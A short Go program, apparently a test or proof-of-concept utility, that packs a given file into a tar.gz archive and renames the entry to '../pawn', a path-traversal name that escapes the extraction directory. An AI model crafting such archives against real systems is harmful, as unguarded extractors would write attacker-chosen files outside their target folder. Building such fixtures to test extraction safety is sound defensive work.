package main

import (
	"archive/tar"
	"compress/gzip"
	"io"
	"os"
)

func main() {
	input, err := os.Open(os.Args[1])
	if err != nil {
		panic(err)
	}
	defer func() { _ = input.Close() }()
	info, err := input.Stat()
	if err != nil {
		panic(err)
	}
	output, err := os.Create(os.Args[2])
	if err != nil {
		panic(err)
	}
	compressed := gzip.NewWriter(output)
	archive := tar.NewWriter(compressed)
	header, err := tar.FileInfoHeader(info, "")
	if err != nil {
		panic(err)
	}
	header.Name = "../pawn"
	if err := archive.WriteHeader(header); err != nil {
		panic(err)
	}
	if _, err := io.Copy(archive, input); err != nil {
		panic(err)
	}
	if err := archive.Close(); err != nil {
		panic(err)
	}
	if err := compressed.Close(); err != nil {
		panic(err)
	}
	if err := output.Close(); err != nil {
		panic(err)
	}
}
